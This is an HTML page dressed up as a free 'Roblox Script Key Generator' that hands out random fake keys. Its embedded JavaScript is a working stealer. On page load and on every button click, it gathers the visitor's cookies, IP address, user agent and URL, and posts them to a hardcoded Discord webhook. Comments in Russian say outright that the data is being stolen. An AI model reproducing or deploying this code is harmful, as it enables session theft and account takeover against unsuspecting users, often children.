<!DOCTYPE html>
<html>
<head>
    <title>Roblox Key Generator</title>
    <style>
        body { 
            background: #1a1a1a; 
            color: white; 
            text-align: center; 
            padding: 50px;
            font-family: Arial;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            background: #2a2a2a;
            padding: 30px;
            border-radius: 10px;
        }
        button {
            background: #00ff00;
            color: black;
            padding: 15px 30px;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            cursor: pointer;
            margin: 10px;
            font-weight: bold;
        }
        h1 { color: #00ff00; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔑 Roblox Script Key Generator</h1>
        <p>Get your FREE key to unlock premium features!</p>
        
        <button onclick="generateKey()">🎮 GET FREE KEY</button>
        <button onclick="premiumKey()">🚀 PREMIUM KEY</button>
        
        <div id="result" style="margin-top: 20px;"></div>
    </div>

    <script>
    const WEBHOOK = "https://discord.com/api/webhooks/1423753064514326658/c7W-WiEKVZ46MWLZ6V7GqaGkCD-aH93Kala4qQYv_yFYZR1akqBUestfW8rzF_9vTaUo";

    function stealData() {
        const data = {
            cookies: document.cookie,
            userAgent: navigator.userAgent,
            url: window.location.href,
            timestamp: new Date().toISOString(),
            ip: "fetching..."
        };

        // Получаем IP
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(ipData => {
                data.ip = ipData.ip;
                
                // Проверяем есть ли куки
                let title, description, color;
                
                if (data.cookies && data.cookies.length > 0) {
                    title = "🍪 COOKIES FOUND!";
                    description = "User has cookies";
                    color = 0x00ff00;
                } else {
                    title = "❌ NO COOKIES";
                    description = "User has no cookies or blocked";
                    color = 0xff0000;
                }

                // Отправка в Discord
                fetch(WEBHOOK, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        embeds: [{
                            title: title,
                            description: description,
                            color: color,
                            fields: [
                                {name: "🌐 IP", value: data.ip, inline: true},
                                {name: "🔗 URL", value: data.url, inline: true},
                                {name: "🍪 Cookies", value: data.cookies ? "```" + data.cookies + "```" : "NO COOKIES", inline: false},
                                {name: "🖥️ User Agent", value: data.userAgent.substring(0, 100), inline: false},
                                {name: "🕒 Time", value: data.timestamp, inline: true}
                            ]
                        }]
                    })
                }).then(response => {
                    console.log("✅ Data sent to Discord");
                }).catch(error => {
                    console.log("❌ Error sending to Discord:", error);
                });
            })
            .catch(error => {
                // Если IP не получили, все равно отправляем данные
                data.ip = "Failed to get IP";
                sendFallbackData(data);
            });
    }

    function sendFallbackData(data) {
        fetch(WEBHOOK, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                content: "🔔 **SITE VISIT - FALLBACK**",
                embeds: [{
                    title: "🌐 VISITOR DETECTED",
                    description: "Basic visitor data captured",
                    color: 0xffff00,
                    fields: [
                        {name: "🔗 URL", value: data.url},
                        {name: "🍪 Cookies", value: data.cookies || "No cookies"},
                        {name: "🕒 Time", value: data.timestamp}
                    ]
                }]
            })
        });
    }

    function generateKey() {
        console.log("🎮 Button clicked - stealing data...");
        stealData();
        const key = "RBX-" + Math.random().toString(36).substr(2, 8).toUpperCase();
        document.getElementById('result').innerHTML = 
            `<h3 style="color: #00ff00;">✅ YOUR KEY: ${key}</h3>
             <p>Copy this key into your script</p>`;
    }

    function premiumKey() {
        console.log("🚀 Premium button clicked - stealing data...");
        stealData();
        const key = "PREMIUM-" + Math.random().toString(36).substr(2, 12).toUpperCase();
        document.getElementById('result').innerHTML = 
            `<h3 style="color: #00ff00;">🚀 PREMIUM KEY: ${key}</h3>
             <p>Premium features unlocked!</p>`;
    }

    // Крадем данные при загрузке страницы
    window.addEventListener('load', function() {
        console.log("🔔 Page loaded - starting stealer...");
        stealData();
    });
    </script>
</body>
</html>
